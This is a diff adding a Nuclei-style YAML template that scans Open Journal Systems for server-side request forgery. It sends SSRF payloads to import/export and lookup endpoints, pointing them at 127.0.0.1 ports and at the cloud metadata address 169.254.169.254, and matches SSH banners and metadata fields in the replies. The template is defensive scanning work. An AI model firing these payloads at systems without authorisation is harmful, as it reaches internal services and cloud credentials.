@@ -1,0 +1,87 @@
+id: ojs-ssrf-detection
+
+info:
+  name: OJS Server-Side Request Forgery Detection
+  author: OJS-Security-Scanner
+  severity: high
+  description: |
+    Deteksi Server-Side Request Forgery (SSRF) pada OJS.
+    Test endpoint yang menerima URL sebagai input seperti plugin import/export
+    dan external citation lookup. SSRF dapat digunakan untuk scan internal
+    network, akses cloud metadata, atau bypass firewall.
+  tags:
+    - ojs
+    - ssrf
+    - network
+    - cloud
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-918
+
+http:
+  # Test 1: SSRF via import plugin URL (UserImportExport)
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/management/importexport/plugin/UserImportExportPlugin"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        name: import_plugin_accessible
+        regex:
+          - "(?i)(import|export|upload|url|fetch)"
+        internal: true
+
+  # Test 2: SSRF via external tool URL field
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/management/importexport/plugin/CrossRefExportPlugin"
+
+    body: "targetSampleUrl=http://127.0.0.1:22"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Connection refused"
+          - "SSH"
+          - "OpenSSH"
+          - "refused to connect"
+          - "ssh-"
+        condition: or
+
+      - type: word
+        words:
+          - "timeout"
+          - "connect"
+        condition: or
+
+  # Test 3: SSRF via citation lookup URL
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/workflow/index/1/1?lookupUrl=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/index.php/index/api/v1/dois?doiUrl=http://127.0.0.1:80"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "mac"
+          - "placement"
+        condition: or
+
+      - type: regex
+        regex:
+          - "169\\.254\\.169\\.254"
+          - "\\d+\\.\\d+\\.\\d+\\.\\d+"
